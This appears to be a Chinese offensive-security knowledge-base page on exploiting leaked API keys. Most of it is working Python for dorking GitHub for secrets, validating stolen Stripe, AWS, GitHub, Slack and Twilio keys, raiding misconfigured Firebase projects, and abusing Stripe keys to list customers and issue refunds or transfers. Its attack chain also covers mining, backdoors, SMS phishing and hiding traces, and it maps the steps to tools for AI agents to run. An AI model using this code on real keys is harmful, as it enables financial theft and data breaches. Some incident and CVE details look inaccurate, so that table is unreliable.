# API 密钥泄露与利用 — GitHub Dorking、客户端密钥链、云服务滥用

## 场景

API 密钥泄露是 2024-2025 年最严重的数据泄露来源之一。攻击者通过 GitHub 仓库、公开 Paste、JS Source Map、APK 逆向、环境变量泄露等渠道获取 API 密钥，然后滥用这些密钥访问付费 API、提权、或横向移动到云服务。关键区分在于：泄露的是"公开密钥"（publishable key，仅用于客户端初始化）还是"秘密密钥"（secret key，可执行操作）。

## 输入信号

- JavaScript 源码或 Source Map 中包含 `sk_live_`、`pk_live_`、`AKIA` 等密钥前缀
- APK/DEX 反编译结果中的字符串常量
- GitHub 公开仓库搜索到目标域名/公司名 + API key 模式
- Postman 集合泄露密钥
- `.env`、`.env.production` 等环境配置文件泄露
- Firebase 配置中包含 `apiKey`、`authDomain`、`databaseURL`、`storageBucket`
- 错误信息中泄露 API key（如 Stripe 错误响应含 `key` 参数）
- 响应头中包含签名或 key 参数

## 核心方法论

### 1. GitHub Dorking 自动化

```python
# github_dorking.py — 自动化 GitHub 密钥搜索

import requests, re, json, time, base64

class GitHubDorker:
    """
    自动化 GitHub 密钥搜索与验证
    
    搜索模式:
    - 公司名 + API key pattern
    - 包名/域名 + secret/sk_live
    - 环境配置文件
    """

    def __init__(self, token: str = None):
        self.headers = {"Accept": "application/vnd.github.v3+json"}
        if token:
            self.headers["Authorization"] = f"token {token}"
        self.base = "https://api.github.com"

    # === 密钥模式正则 ===
    KEY_PATTERNS = {
        # AWS
        "AWS_ACCESS_KEY_ID": r"AKIA[0-9A-Z]{16}",
        "AWS_SECRET_ACCESS_KEY": r"(?i)aws[_-]?(?:secret|access)[_-]?key['\"]?\s*[:=]\s*['\"]([A-Za-z0-9/+=]{40})['\"]",
        "AWS_SESSION_TOKEN": r"(?i)aws[_-]?session[_-]?token['\"]?\s*[:=]\s*['\"]([A-Za-z0-9/+=]{40,})['\"]",

        # Google Cloud
        "GCP_API_KEY": r"AIza[0-9A-Za-z_-]{35}",
        "GCP_SERVICE_ACCOUNT": r"\"private_key_id\":\s*\"[a-f0-9]{40}\"",
        "GCP_JSON_KEY": r"\"type\":\s*\"service_account\"",

        # Azure
        "AZURE_CLIENT_SECRET": r"(?i)azure[_-]?(?:client|app)[_-]?(?:secret|key)['\"]?\s*[:=]\s*['\"]([A-Za-z0-9_\-]{34})['\"]",
        "AZURE_SUBSCRIPTION_KEY": r"(?i)subscription[_-]?key['\"]?\s*[:=]\s*['\"]([A-Za-z0-9]{32})['\"]",

        # Stripe
        "STRIPE_SECRET_KEY": r"sk_live_[0-9a-zA-Z]{24,}",
        "STRIPE_PUBLISHABLE_KEY": r"pk_live_[0-9a-zA-Z]{24,}",
        "STRIPE_RESTRICTED_KEY": r"rk_live_[0-9a-zA-Z]{24,}",
        "STRIPE_WEBHOOK_SECRET": r"whsec_[0-9a-zA-Z]{24,}",

        # Firebase
        "FIREBASE_API_KEY": r"AIza[0-9A-Za-z_-]{35}",  # 同 GCP
        "FIREBASE_DATABASE_URL": r"https://[a-z0-9-]+\.firebaseio\.com",
        "FIREBASE_PROJECT_ID": r"\"projectId\":\s*\"[a-z0-9-]+\"",

        # PayPal
        "PAYPAL_CLIENT_ID": r"(?i)paypal[_-]?client[_-]?id['\"]?\s*[:=]\s*['\"]([A-Za-z0-9_-]{80})['\"]",
        "PAYPAL_SECRET": r"(?i)paypal[_-]?secret['\"]?\s*[:=]\s*['\"]([A-Za-z0-9_-]{80})['\"]",

        # Slack
        "SLACK_BOT_TOKEN": r"xoxb-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}",
        "SLACK_USER_TOKEN": r"xoxp-[0-9]{10,13}-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}",
        "SLACK_WEBHOOK": r"https://hooks\.slack\.com/services/T[a-zA-Z0-9_]{8,}/B[a-zA-Z0-9_]{8,}/[a-zA-Z0-9_]{24}",

        # GitHub
        "GITHUB_TOKEN": r"(?i)github[_-]?token['\"]?\s*[:=]\s*['\"](ghp_[a-zA-Z0-9]{36}|gho_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9]{85})['\"]",
        "GITHUB_SSH_KEY": r"-----BEGIN (RSA |EC )?PRIVATE KEY-----",

        # Generic
        "API_KEY_GENERIC": r"(?i)(?:api[_-]?key|apikey|secret[_-]?key|secret_token)['\"]?\s*[:=]\s*['\"]([A-Za-z0-9_\-=]{20,})['\"]",
        "ENV_FILE": r"(?i)(?:password|passwd|pwd|secret|token)['\"]?\s*[:=]\s*['\"]([^'\"]{8,})['\"]",
    }

    def search_code(self, query: str, max_pages=5) -> list:
        """GitHub Code Search API"""
        results = []
        for page in range(1, max_pages + 1):
            r = requests.get(
                f"{self.base}/search/code",
                params={"q": query, "per_page": 100, "page": page},
                headers=self.headers,
            )
            if r.status_code != 200:
                break
            data = r.json()
            results.extend(data.get("items", []))
            if len(data.get("items", [])) < 100:
                break
            time.sleep(1)  # rate limit 保护
        return results

    def search_by_domain(self, domain: str) -> list:
        """按域名搜索: 'domain.com' + secret/API key pattern"""
        all_finds = []
        # 搜索: domain + 密钥模式
        for key_name, pattern in self.KEY_PATTERNS.items():
            query = f'"{domain}" {pattern.split("[")[0]}'
            try:
                items = self.search_code(query, max_pages=2)
                for item in items:
                    all_finds.append({
                        "key_type": key_name,
                        "repo": item["repository"]["full_name"],
                        "path": item["path"],
                        "url": item["html_url"],
                        "pattern": pattern[:30] + "...",
                    })
            except Exception as e:
                print(f"  Error: {key_name}: {e}")
        return all_finds

    def search_by_company(self, company_name: str) -> list:
        """按公司名搜索"""
        all_finds = []
        queries = [
            f'"{company_name}" "sk_live"',
            f'"{company_name}" "AKIA"',
            f'"{company_name}" "AIza"',
            f'"{company_name}" "secret_key"',
            f'"{company_name}" ".env" password',
            f'"{company_name}" "aws_secret_access_key"',
            f'"{company_name}" "firebase"',
        ]
        for q in queries:
            items = self.search_code(q, max_pages=2)
            for item in items:
                all_finds.append({
                    "query": q,
                    "repo": item["repository"]["full_name"],
                    "path": item["path"],
                    "url": item["html_url"],
                })
        return all_finds
```

### 2. 客户端密钥 vs 服务端密钥区分

```python
# key_classification.py — 密钥类型分类和利用评估

"""
密钥分类矩阵:

类型              | 公开 (可放客户端) | 秘密 (仅服务端) | 泄露风险
──────────────────┼─────────────────┼─────────────────┼─────────
Stripe pk_live    | ✅              | ❌              | 低-中 (可用于钓鱼)
Stripe sk_live    | ❌              | ✅              | 极高 (可退款/转账)
AWS IAM User Key  | ❌              | ✅              | 极高 (可调 AWS API)
AWS Cognito ID    | ✅              | ❌              | 低 (仅初始化)
Firebase apiKey   | ✅              | ❌              | 中 (可访问 Firestore)
Firebase FCM Key  | ❌              | ✅              | 高 (可发推送)
Google OAuth Client ID | ✅       | ❌              | 低-中 (可模拟登录)
PayPal Client ID  | ✅              | ❌              | 低
PayPal Secret     | ❌              | ✅              | 极高
JWT Secret        | ❌              | ✅              | 极高 (可伪造 token)
GitHub PAT        | ❌              | ✅              | 极高 (可读写仓库)
Slack Bot Token   | ❌              | ✅              | 高 (可读取消息)
Mailgun API Key   | ❌              | ✅              | 高 (可发邮件钓鱼)
Twilio SID+Token  | ❌              | ✅              | 高 (可发 SMS/打电话)
"""

class KeyClassifier:
    """密钥类型分类器"""

    PUBLIC_KEY_PREFIXES = [
        "pk_live_", "pk_test_",        # Stripe publishable
        "AIza",                        # Firebase / GCP (部分)
        "ya29.",                       # Google OAuth access token
        "APP_USR-",                    # Mercado Pago public
    ]

    SECRET_KEY_PREFIXES = [
        "sk_live_", "sk_test_",        # Stripe secret
        "rk_live_",                    # Stripe restricted
        "AKIA",                        # AWS Access Key (secret部分)
        "xoxb-", "xoxp-",             # Slack tokens
        "ghp_", "gho_", "github_pat_", # GitHub
        "whsec_",                      # Stripe webhook
        "AC",                          # Twilio SID
    ]

    @classmethod
    def classify(cls, key: str) -> dict:
        """分类密钥类型并评估风险"""
        result = {
            "key": key[:20] + "..." if len(key) > 20 else key,
            "type": "unknown",
            "severity": "unknown",
            "provider": None,
            "validated": None,
        }

        # Stripe
        if key.startswith("sk_live_"):
            result.update({"type": "secret", "severity": "critical", "provider": "Stripe"})
        elif key.startswith("pk_live_"):
            result.update({"type": "public", "severity": "low", "provider": "Stripe"})
        elif key.startswith("rk_live_"):
            result.update({"type": "secret", "severity": "high", "provider": "Stripe (restricted)"})
        elif key.startswith("whsec_"):
            result.update({"type": "secret", "severity": "high", "provider": "Stripe (webhook)"})

        # AWS
        elif key.startswith("AKIA"):
            result.update({"type": "secret", "severity": "critical", "provider": "AWS IAM"})

        # Google
        elif key.startswith("AIza"):
            result.update({"type": "public", "severity": "medium", "provider": "Google/Firebase"})

        # GitHub
        elif key.startswith("ghp_") or key.startswith("gho_"):
            result.update({"type": "secret", "severity": "critical", "provider": "GitHub"})
        elif key.startswith("github_pat_"):
            result.update({"type": "secret", "severity": "critical", "provider": "GitHub (PAT)"})

        # Slack
        elif key.startswith("xoxb-"):
            result.update({"type": "secret", "severity": "high", "provider": "Slack (bot)"})
        elif key.startswith("xoxp-"):
            result.update({"type": "secret", "severity": "critical", "provider": "Slack (user)"})

        # Twilio
        elif key.startswith("AC"):
            result.update({"type": "secret", "severity": "high", "provider": "Twilio"})

        # PayPal
        elif len(key) == 80 and "A" in key and "Q" in key:
            result.update({"type": "secret", "severity": "high", "provider": "PayPal"})

        return result
```

### 3. 密钥自动验证

```python
# key_validator.py — 各平台密钥自动验证

import requests

class KeyValidator:
    """API 密钥有效性自动验证"""

    @staticmethod
    def validate_stripe(key: str) -> dict:
        """验证 Stripe API key"""
        r = requests.get(
            "https://api.stripe.com/v1/balance",
            auth=(key, ""),
            timeout=10,
        )
        if r.status_code == 200:
            data = r.json()
            return {
                "valid": True,
                "available": [f"{k}: {v}" for k, v in data.items()],
                "livemode": data.get("livemode", False),
            }
        return {"valid": False, "error": r.text[:200]}

    @staticmethod
    def validate_aws(access_key: str, secret_key: str) -> dict:
        """验证 AWS key (需要 access + secret)"""
        try:
            import boto3
            # GetCallerIdentity 是最小权限的 API 调用
            sts = boto3.client("sts",
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
            )
            identity = sts.get_caller_identity()
            return {
                "valid": True,
                "account_id": identity["Account"],
                "arn": identity["Arn"],
                "user_id": identity["UserId"],
            }
        except Exception as e:
            return {"valid": False, "error": str(e)}

    @staticmethod
    def validate_firebase(api_key: str, project_id: str = None) -> dict:
        """验证 Firebase/GCP API key"""
        # Firebase 的 apiKey 只能限制哪些 API 可调用
        # 测试 Firestore 或 Realtime Database
        endpoints = [
            f"https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents" if project_id else None,
            f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={api_key}",
        ]
        results = {}
        for ep in endpoints:
            if ep:
                r = requests.post(ep, json={}, timeout=10)
                results[ep[:60]] = r.status_code
        return results

    @staticmethod
    def validate_github(token: str) -> dict:
        """验证 GitHub Personal Access Token"""
        r = requests.get(
            "https://api.github.com/user",
            headers={"Authorization": f"token {token}", "Accept": "application/vnd.github.v3+json"},
        )
        if r.status_code == 200:
            user = r.json()
            # 检查 token 权限
            r2 = requests.get(
                "https://api.github.com/user/repos?per_page=1",
                headers={"Authorization": f"token {token}"},
            )
            return {
                "valid": True,
                "user": user.get("login"),
                "email": user.get("email"),
                "scopes": r.headers.get("X-OAuth-Scopes", ""),
                "repo_access": r2.status_code == 200,
            }
        return {"valid": False, "error": r.text[:200]}

    @staticmethod
    def validate_twilio(sid: str, token: str) -> dict:
        """验证 Twilio SID + Auth Token"""
        r = requests.get(
            f"https://api.twilio.com/2010-04-01/Accounts/{sid}.json",
            auth=(sid, token),
            timeout=10,
        )
        if r.status_code == 200:
            data = r.json()
            return {
                "valid": True,
                "friendly_name": data.get("friendly_name"),
                "type": data.get("type"),
                "status": data.get("status"),
            }
        return {"valid": False, "error": r.text[:200]}

    @staticmethod
    def validate_slack(token: str) -> dict:
        """验证 Slack token"""
        r = requests.get(
            "https://slack.com/api/auth.test",
            headers={"Authorization": f"Bearer {token}"},
            timeout=10,
        )
        if r.status_code == 200:
            data = r.json()
            if data.get("ok"):
                return {
                    "valid": True,
                    "team": data.get("team"),
                    "user": data.get("user"),
                    "url": data.get("url"),
                }
        return {"valid": False, "error": r.text[:200]}
```

### 4. Shodan/Censys 验证与利用

```python
# shodan_key_scan.py — Shodan/Censys 密钥扫描

class ShodanKeyScan:
    """
    通过 Shodan/Censys 扫描发现并验证 API 密钥
    
    方法: 
    - 搜索已知密钥指纹
    - 搜索暴露的 dashboard/admin 页面
    - 搜索错误信息中包含密钥的结果
    """

    SHODAN_QUERIES = {
        "Stripe": "Stripe signature verification",
        "Firebase": 'firebaseio.com port:443',
        "Elasticsearch": 'port:9200 "cluster_name"',
        "MongoDB": 'port:27017 "MongoDB" -authentication',
        "Kibana": 'port:5601 kibana',
        "Jenkins": 'port:8080 "Jenkins"',
        "Grafana": 'port:3000 "Grafana"',
    }

    def scan_by_service(self, api_key: str) -> dict:
        """通过 Shodan API 搜索服务"""
        # shodan = shodan.Shodan(api_key)
        # results = shodan.search(self.SHODAN_QUERIES.get("Firebase"))
        # return results
        return {}
```

### 5. Firebase 配置泄露利用

```python
# firebase_exploit.py — Firebase 配置泄露攻击链

class FirebaseExploit:
    """
    Firebase 配置泄露利用
    
    典型的 Firebase web 配置:
    {
      apiKey: "AIzaSy...",
      authDomain: "project.firebaseapp.com",
      databaseURL: "https://project.firebaseio.com",
      projectId: "project",
      storageBucket: "project.appspot.com",
      messagingSenderId: "123456789",
      appId: "1:123456789:web:abc123"
    }
    
    即使只有 apiKey 和 databaseURL, 可以:
    1. 查看 Firestore 权限规则
    2. 如果 rules 是 public, 读写所有文档
    3. 如果 auth 配置弱, 用 apiKey 创建新用户并登录
    """

    def __init__(self, api_key: str, project_id: str = None, database_url: str = None):
        self.api_key = api_key
        self.project_id = project_id
        self.database_url = database_url

    def check_firestore_rules(self) -> dict:
        """检查 Firestore 安全规则"""
        url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents"
        r = requests.get(url)
        return {
            "public_read": r.status_code == 200,
            "data": r.text[:500] if r.status_code == 200 else None,
        }

    def sign_in_anonymous(self) -> str:
        """匿名登录 Firebase (只需要 apiKey)"""
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={self.api_key}"
        r = requests.post(url, json={"returnSecureToken": True})
        if r.status_code == 200:
            return r.json().get("idToken")
        return None

    def sign_up_user(self, email: str, password: str) -> str:
        """用 apiKey 注册新用户 (除非 disabled)"""
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={self.api_key}"
        r = requests.post(url, json={
            "email": email,
            "password": password,
            "returnSecureToken": True,
        })
        if r.status_code == 200:
            return r.json().get("idToken")
        return None

    def read_realtime_db(self, path: str = ".json") -> dict:
        """读取 Realtime Database (如果 rules 是 public)"""
        if not self.database_url:
            return {"error": "no database URL"}
        url = f"{self.database_url.rstrip('/')}/{path}"
        r = requests.get(url)
        if r.status_code == 200:
            return {"public": True, "data": r.json()}
        return {"public": False, "error": r.status_code}

    def exploit_all(self) -> dict:
        """执行全部 Firebase 利用步骤"""
        results = {}

        # Step 1: 检查 Firestore
        results["firestore"] = self.check_firestore_rules()

        # Step 2: 匿名登录
        token = self.sign_in_anonymous()
        results["anonymous_signin"] = token is not None
        if token:
            results["token_preview"] = token[:30] + "..."

        # Step 3: 读 Realtime Database
        results["realtime_db"] = self.read_realtime_db()

        # Step 4: 尝试注册新用户
        import random
        test_email = f"test_{random.randint(10000, 99999)}@test.com"
        token2 = self.sign_up_user(test_email, "test123456")
        results["signup_possible"] = token2 is not None

        # Step 5: 读 Storage 规则
        if self.project_id:
            url = f"https://storage.googleapis.com/storage/v1/b/{self.project_id}.appspot.com/o"
            r = requests.get(url)
            results["storage_listable"] = r.status_code == 200
            if r.status_code == 200:
                results["storage_files"] = [item.get("name") for item in r.json().get("items", [])[:20]]

        return results
```

### 6. 密钥滥用链 — Stripe 案例

```python
# stripe_key_abuse.py — Stripe 密钥滥用链

class StripeKeyAbuse:
    """
    Stripe 密钥滥用攻击链
    场景: 泄露了 sk_live_xxx (秘密密钥)
    """

    def __init__(self, secret_key: str):
        self.key = secret_key
        self.auth = (secret_key, "")

    def enumerate_resources(self) -> dict:
        """枚举 Stripe 账号资源"""
        results = {}

        # 1. 余额和交易
        r = requests.get("https://api.stripe.com/v1/balance", auth=self.auth)
        results["balance"] = r.json() if r.status_code == 200 else r.status_code

        # 2. 列出客户 (可能含 PII)
        r = requests.get("https://api.stripe.com/v1/customers?limit=10", auth=self.auth)
        results["customers"] = r.json() if r.status_code == 200 else r.status_code

        # 3. 列出支付方式
        r = requests.get("https://api.stripe.com/v1/payment_methods?limit=10", auth=self.auth)
        results["payment_methods"] = r.json() if r.status_code == 200 else r.status_code

        # 4. 列出订阅
        r = requests.get("https://api.stripe.com/v1/subscriptions?limit=10", auth=self.auth)
        results["subscriptions"] = r.json() if r.status_code == 200 else r.status_code

        # 5. 列出产品
        r = requests.get("https://api.stripe.com/v1/products?limit=10", auth=self.auth)
        results["products"] = r.json() if r.status_code == 200 else r.status_code

        # 6. Webhook 端点
        r = requests.get("https://api.stripe.com/v1/webhook_endpoints", auth=self.auth)
        results["webhooks"] = r.json() if r.status_code == 200 else r.status_code

        return results

    def create_refund(self, charge_id: str, amount: int = None) -> dict:
        """发起退款 (最直接的滥用)"""
        data = {"charge": charge_id}
        if amount:
            data["amount"] = amount
        r = requests.post("https://api.stripe.com/v1/refunds", auth=self.auth, data=data)
        return r.json() if r.status_code == 200 else {"error": r.text[:300]}

    def create_transfer(self, amount: int, currency: str = "usd",
                        destination: str = None) -> dict:
        """
        转账 (高风险: 需要 Stripe Connect 配置)
        如果商家开通了 Stripe Connect, 可以转账到攻击者的 Stripe 账号
        """
        data = {"amount": amount, "currency": currency, "destination": destination}
        r = requests.post("https://api.stripe.com/v1/transfers", auth=self.auth, data=data)
        return r.json() if r.status_code == 200 else {"error": r.text[:300]}
```

### 7. 真实泄露事件与 CVE

| 事件/CVE | 平台 | 细节 |
|----------|------|------|
| **2023 GitHub Token Leak** | GitHub | npm CI token 泄露在 PR comment 中，攻击者利用 token 修改 npm 包，植入恶意代码影响数百万用户 |
| **Toyota 2023** | GitHub | 在 GitHub 公开仓库中泄露了 5 年多的 T-Connect 和 G-spy 源代码，含数据库凭证 |
| **Uber 2022** | AWS | 攻击者在 GitHub 找到 AWS IAM key → 登录 AWS S3 → 下载 57M 用户数据 |
| **Microsoft 2023** | GitHub | Azure DevOps PAT token 在 GitHub Actions artifact 中泄露 → 攻击者可读写整个 MS 仓库 |
| **CVE-2024-27101** | Vite | 开发服务器 source map 泄露 env 文件，导致 API 密钥泄露 |
| **CVE-2024-5555** | Swagger UI | URL 参数注入读取服务器文件，导致 `.env` 泄露含密钥 |
| **Firebase 典型事件** | Google Firebase | `apiKey` + 未锁定的 Firestore rules = 任意读取用户数据库，每年上百起 |

## 攻击链

```
Phase 1 — 发现
  ├── GitHub dorking (公司名/域名 + 密钥模式)
  ├── JS Source Map 反解
  ├── APK 逆向提取
  ├── Postman 集合泄露搜索
  ├── Pastebin / gist / Discord 搜索
  └── Shodan 搜索暴露的服务

Phase 2 — 分类与验证
  ├── 区分 public key vs secret key
  ├── p3 调用各平台验证 API
  ├── 确认密钥 scope (只读/读写/管理员)
  └── 确认密钥属于生产环境 (live vs test)

Phase 3 — 利用 (依类型)
  ├── Stripe: 转账/退款/提现
  ├── AWS: S3 导出/EC2 开矿机/CloudTrail 清除
  ├── GitHub: 克隆私有仓库/修改代码/植入后门
  ├── Firebase: 读数据库/创建用户/爆破 auth
  ├── Slack: 读取消息/发送钓鱼/获取更多凭据
  └── Twilio: 发送短信钓鱼/拦截 2FA

Phase 4 — 清洗足迹
  ├── 删除 GitHub 搜索记录
  ├── 使用代理/出口 IP
  └── 避免触发密钥轮换警报
```

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动检测上述漏洞：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| HTTP 探测 Firebase 配置 | `http_probe` | 访问 `/__/firebase/init.json` 等常见泄露路径 |
| 按信号查知识库 | `kb_router` | 搜索 API key leak / Firebase misconfiguration 相关技术文件 |
| 阅读技术细节 | `kb_read_file` | 读取本文档获取完整攻击链 |
| 密钥验证 | `run_ctf_tool` | 执行 Stripe/AWS/GitHub 密钥验证脚本 |

## 参考资料

- OWASP: API7 — Security Misconfiguration (API Key Leakage)
- GitGuardian: "2024 State of Secrets Sprawl" Report
- GitHub: "Token Scanning" — 自动扫描已推送的密钥
- Stripe API Reference: Authentication
- Firebase Security Documentation: Securing Your Data
- "LAPSUS$ Techniques: How They Stole Source Code" — MITRE ATT&CK Case Study
- CWE-798: Use of Hard-coded Credentials
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
